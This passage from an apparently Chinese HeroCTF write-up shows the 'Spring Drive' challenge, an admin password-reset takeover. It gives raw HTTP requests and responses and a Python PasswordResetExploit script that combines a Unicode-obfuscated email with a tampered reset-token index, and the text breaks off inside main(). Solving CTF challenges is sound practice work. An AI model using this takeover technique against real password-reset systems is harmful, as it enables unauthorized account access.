+        flag <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'(Hero&#123;.*?&#125;)'</span><span class="token punctuation">,</span> r_final<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n    </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Flag 匹配失败，请手动查看响应。"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token operator">*</span><span class="token number">40</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 攻击失败。"</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"Administrators"</span> <span class="token keyword">in</span> r_final<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"提示: 页面显示组为 Administrators，但 Flag 未出现 (可能需要特定 URL 或参数)。"</span><span class="token punctuation">)</span>
+        <span class="token keyword">elif</span> <span class="token string">"You are not part of"</span> <span class="token keyword">in</span> r_final<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"提示: 依然提示权限不足 (Assertion 顺序可能反了，或者漏洞已修补)。"</span><span class="token punctuation">)</span>
+        
+        <span class="token comment"># 打印部分响应</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> <span class="token string">" Response Preview "</span> <span class="token operator">+</span> <span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>r_final<span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li>
+</ol>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129232329.png" alt="image.png" loading="lazy"></p>
+<h3 id="Spring-Drive"><a href="#Spring-Drive" class="headerlink" title="Spring Drive"></a>Spring Drive</h3><p>首先是token碰撞修改admin密码</p>
+<pre class="language-none"><code class="language-none">POST &#x2F;api&#x2F;auth&#x2F;send-password-reset HTTP&#x2F;1.1
+Host: dyn14.heroctf.fr:11713
+Cookie: SESSION&#x3D;M2RlOTExOGYtNTA0Yi00MjM5LWI1NDgtN2Y0ODBiMzhkMDlk
+Upgrade-Insecure-Requests: 1
+Priority: u&#x3D;0, i
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko&#x2F;20100101 Firefox&#x2F;140.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application&#x2F;json
+
+&#123;
+  &quot;email&quot;: &quot;test@123.com&quot;
+&#125;
+
+
+HTTP&#x2F;1.1 200
+Server: nginx&#x2F;1.22.1
+Date: Sun, 30 Nov 2025 00:40:09 GMT
+Content-Type: application&#x2F;json
+Connection: keep-alive
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: content-type,x-requested-with
+Access-Control-Allow-Credentials: true
+Content-Length: 70
+
+&#123;&quot;status&quot;:&quot;success&quot;,&quot;message&quot;:&quot;Password reset email sent&quot;,&quot;data&quot;:null&#125;
+</code></pre>
+
+
+
+<pre class="language-none"><code class="language-none">GET &#x2F;api&#x2F;auth&#x2F;email HTTP&#x2F;1.1
+Host: dyn14.heroctf.fr:11713
+Cookie: SESSION&#x3D;M2RlOTExOGYtNTA0Yi00MjM5LWI1NDgtN2Y0ODBiMzhkMDlk
+Upgrade-Insecure-Requests: 1
+Priority: u&#x3D;0, i
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko&#x2F;20100101 Firefox&#x2F;140.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+
+
+HTTP&#x2F;1.1 200
+Server: nginx&#x2F;1.22.1
+Date: Sun, 30 Nov 2025 00:40:28 GMT
+Content-Type: application&#x2F;json
+Connection: keep-alive
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: content-type,x-requested-with
+Access-Control-Allow-Credentials: true
+Content-Length: 132
+
+&#123;&quot;status&quot;:&quot;success&quot;,&quot;message&quot;:null,&quot;data&quot;:[&quot;ResetPasswordToken [token&#x3D;343d1a6a-a0a4-41ed-90ba-7b973de5f42f|2, email&#x3D;test@123.com]&quot;]&#125;
+</code></pre>
+
+<pre class="language-none"><code class="language-none">POST &#x2F;api&#x2F;auth&#x2F;send-password-reset HTTP&#x2F;1.1
+Host: dyn14.heroctf.fr:11713
+Cookie: SESSION&#x3D;M2RlOTExOGYtNTA0Yi00MjM5LWI1NDgtN2Y0ODBiMzhkMDlk
+Upgrade-Insecure-Requests: 1
+Priority: u&#x3D;0, i
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko&#x2F;20100101 Firefox&#x2F;140.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application&#x2F;json
+
+&#123;
+  &quot;email&quot;: &quot;admin@example.com&quot;
+&#125;
+
+HTTP&#x2F;1.1 200
+Server: nginx&#x2F;1.22.1
+Date: Sun, 30 Nov 2025 00:41:42 GMT
+Content-Type: application&#x2F;json
+Connection: keep-alive
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: content-type,x-requested-with
+Access-Control-Allow-Credentials: true
+Content-Length: 70
+
+&#123;&quot;status&quot;:&quot;success&quot;,&quot;message&quot;:&quot;Password reset email sent&quot;,&quot;data&quot;:null&#125;</code></pre>
+
+<pre class="language-none"><code class="language-none">POST &#x2F;api&#x2F;auth&#x2F;reset-password HTTP&#x2F;1.1
+Host: dyn14.heroctf.fr:11713
+Cookie: SESSION&#x3D;M2RlOTExOGYtNTA0Yi00MjM5LWI1NDgtN2Y0ODBiMzhkMDlk
+Upgrade-Insecure-Requests: 1
+Priority: u&#x3D;0, i
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko&#x2F;20100101 Firefox&#x2F;140.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application&#x2F;json
+
+&#123;
+  &quot;email&quot;: &quot;\u3DEE\u5F85\uD5D5\u5A05\uA19F&quot;,
+  &quot;token&quot;: &quot;343d1a6a-a0a4-41ed-90ba-7b973de5f42f|1&quot;,
+  &quot;password&quot;: &quot;NewAdminPass123&quot;
+&#125;
+
+
+HTTP&#x2F;1.1 200
+Server: nginx&#x2F;1.22.1
+Date: Sun, 30 Nov 2025 00:46:22 GMT
+Content-Type: application&#x2F;json
+Connection: keep-alive
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: content-type,x-requested-with
+Access-Control-Allow-Credentials: true
+Content-Length: 70
+
+&#123;&quot;status&quot;:&quot;success&quot;,&quot;message&quot;:&quot;Password reset successful&quot;,&quot;data&quot;:null&#125;</code></pre>
+
+<p>写个脚本实现</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> re
+
+<span class="token keyword">class</span> <span class="token class-name">PasswordResetExploit</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> base_url<span class="token punctuation">,</span> session_cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>base_url <span class="token operator">=</span> base_url
+        self<span class="token punctuation">.</span>session_cookie <span class="token operator">=</span> session_cookie
+        self<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'SESSION=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>session_cookie<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>
+            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0'</span><span class="token punctuation">,</span>
+            <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>
+            <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="token punctuation">,</span>
+            <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
+            <span class="token string">'Upgrade-Insecure-Requests'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
+        <span class="token punctuation">&#125;</span>
+        self<span class="token punctuation">.</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
+    
+    <span class="token keyword">def</span> <span class="token function">send_password_reset</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""发送密码重置请求"""</span>
+        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/api/auth/send-password-reset"</span></span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">&#125;</span>
+        
+        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 发送密码重置请求给: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>email<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    状态码: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    响应: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        
+        <span class="token keyword">return</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">def</span> <span class="token function">get_email_tokens</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""获取邮箱中的重置token"""</span>
+        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/api/auth/email"</span></span>
+        
+        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 获取邮箱token列表"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    状态码: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    响应: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        
+        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            data <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'status'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'success'</span> <span class="token keyword">and</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>
+        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    
+    <span class="token keyword">def</span> <span class="token function">extract_token</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> token_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""从响应中提取token"""</span>
+        tokens <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> item <span class="token keyword">in</span> token_data<span class="token punctuation">:</span>
+            <span class="token comment"># 使用正则表达式提取token</span>
+            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'token=([^|]+)\|(\d+)'</span><span class="token punctuation">,</span> item<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
+                token <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+                email_match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'email=([^\]]+)'</span><span class="token punctuation">,</span> item<span class="token punctuation">)</span>
+                email <span class="token operator">=</span> email_match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">if</span> email_match <span class="token keyword">else</span> <span class="token string">"unknown"</span>
+                tokens<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                    <span class="token string">'token'</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span>
+                    <span class="token string">'email'</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span>
+                    <span class="token string">'full_token'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> tokens
+    
+    <span class="token keyword">def</span> <span class="token function">obfuscate_email</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""对邮箱进行Unicode混淆"""</span>
+        <span class="token comment"># 这是你提供的Unicode混淆字符串</span>
+        obfuscated <span class="token operator">=</span> <span class="token string">"\u3DEE\u5F85\uD5D5\u5A05\uA19F"</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 邮箱混淆: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>email<span class="token punctuation">&#125;</span></span><span class="token string"> -> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>obfuscated<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> obfuscated
+    
+    <span class="token keyword">def</span> <span class="token function">reset_password</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> email<span class="token punctuation">,</span> token<span class="token punctuation">,</span> new_password<span class="token punctuation">,</span> use_obfuscation<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""执行密码重置"""</span>
+        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/api/auth/reset-password"</span></span>
+        
+        <span class="token comment"># 根据选择使用混淆或原始邮箱</span>
+        target_email <span class="token operator">=</span> self<span class="token punctuation">.</span>obfuscate_email<span class="token punctuation">(</span>email<span class="token punctuation">)</span> <span class="token keyword">if</span> use_obfuscation <span class="token keyword">else</span> email
+        
+        payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">"email"</span><span class="token punctuation">:</span> target_email<span class="token punctuation">,</span>
+            <span class="token string">"token"</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span>
+            <span class="token string">"password"</span><span class="token punctuation">:</span> new_password
+        <span class="token punctuation">&#125;</span>
+        
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 发送重置请求负载:"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    Email: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_email<span class="token punctuation">&#125;</span></span><span class="token string"> (原始: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>email<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    Token: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    Password: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>new_password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        
+        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    状态码: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    响应: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        
+        <span class="token keyword">return</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target_email<span class="token operator">=</span><span class="token string">"admin@example.com"</span><span class="token punctuation">,</span> new_password<span class="token operator">=</span><span class="token string">"NewAdminPass123"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token triple-quoted-string string">"""执行完整的攻击流程"""</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 开始密码重置攻击流程..."</span><span class="token punctuation">)</span>
+        
+        <span class="token comment"># 1. 先为自己的测试邮箱请求重置，获取token格式</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] 步骤1: 获取token格式..."</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>send_password_reset<span class="token punctuation">(</span><span class="token string">"test@123.com"</span><span class="token punctuation">)</span>
+        
+        <span class="token comment"># 2. 获取邮箱中的token</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] 步骤2: 获取邮箱token..."</span><span class="token punctuation">)</span>
+        token_data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_email_tokens<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        tokens <span class="token operator">=</span> self<span class="token punctuation">.</span>extract_token<span class="token punctuation">(</span>token_data<span class="token punctuation">)</span>
+        
+        <span class="token keyword">if</span> <span class="token keyword">not</span> tokens<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 未找到有效token"</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token boolean">False</span>
+        
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 找到 </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>tokens<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> 个token:"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> t <span class="token keyword">in</span> tokens<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    Token: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>t<span class="token punctuation">[</span><span class="token string">'full_token'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string"> (邮箱: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>t<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>
+        
+        <span class="token comment"># 3. 为目标管理员邮箱发送重置请求</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[*] 步骤3: 为目标邮箱 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_email<span class="token punctuation">&#125;</span></span><span class="token string"> 发送重置请求..."</span></span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>send_password_reset<span class="token punctuation">(</span>target_email<span class="token punctuation">)</span>
+        
+        <span class="token comment"># 4. 尝试使用获取的token格式进行密码重置（带Unicode混淆）</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[*] 步骤4: 使用Unicode混淆尝试重置管理员密码..."</span></span><span class="token punctuation">)</span>
+        
+        <span class="token comment"># 使用第一个token的格式，但修改序号为目标邮箱的序号</span>
+        base_token <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>
+        
+        <span class="token comment"># 尝试不同的序号（先尝试序号1，因为从你的成功请求中看到是|1）</span>
+        token_attempts <span class="token operator">=</span> <span class="token punctuation">[</span>
+            <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_token<span class="token punctuation">&#125;</span></span><span class="token string">|1"</span></span><span class="token punctuation">,</span>  <span class="token comment"># 优先尝试序号1</span>
+            <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_token<span class="token punctuation">&#125;</span></span><span class="token string">|2"</span></span><span class="token punctuation">,</span>
+            <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_token<span class="token punctuation">&#125;</span></span><span class="token string">|3"</span></span><span class="token punctuation">,</span> 
+            <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_token<span class="token punctuation">&#125;</span></span><span class="token string">|4"</span></span>
+        <span class="token punctuation">]</span>
+        
+        <span class="token keyword">for</span> attempt_token <span class="token keyword">in</span> token_attempts<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[*] 尝试Token: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt_token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            
+            <span class="token comment"># 使用Unicode混淆</span>
+            result <span class="token operator">=</span> self<span class="token punctuation">.</span>reset_password<span class="token punctuation">(</span>target_email<span class="token punctuation">,</span> attempt_token<span class="token punctuation">,</span> new_password<span class="token punctuation">,</span> use_obfuscation<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+            
+            <span class="token keyword">if</span> result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'status'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'success'</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 密码重置成功!"</span></span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 管理员邮箱: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_email<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 使用Token: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt_token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 新密码: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>new_password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+                
+                
+                <span class="token keyword">return</span> <span class="token boolean">True</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Token </span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt_token<span class="token punctuation">&#125;</span></span><span class="token string"> 失败"</span></span><span class="token punctuation">)</span>
+    
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 配置参数</span>
+    BASE_URL <span class="token operator">=</span> <span class="token string">"http://192.168.31.210:8081"</span>
+    SESSION_COOKIE <span class="token operator">=</span> <span class="token string">"MThlOTBlYWMtZmZkYy00NDNjLThlOTMtYmFhMTViMjNlYjFl"</span>
+    TARGET_EMAIL <span class="token operator">=</span> <span class="token string">"admin@example.com"</span>
+    NEW_PASSWORD <span class="token operator">=</span> <span class="token string">"12345678"</span>
+    
+    <span class="token comment"># 创建攻击实例</span>
+    exploit <span class="token operator">=</span> PasswordResetExploit<span class="token punctuation">(</span>BASE_URL<span class="token punctuation">,</span> SESSION_COOKIE<span class="token punctuation">)</span>
+    
+    <span class="token comment"># 执行攻击</span>
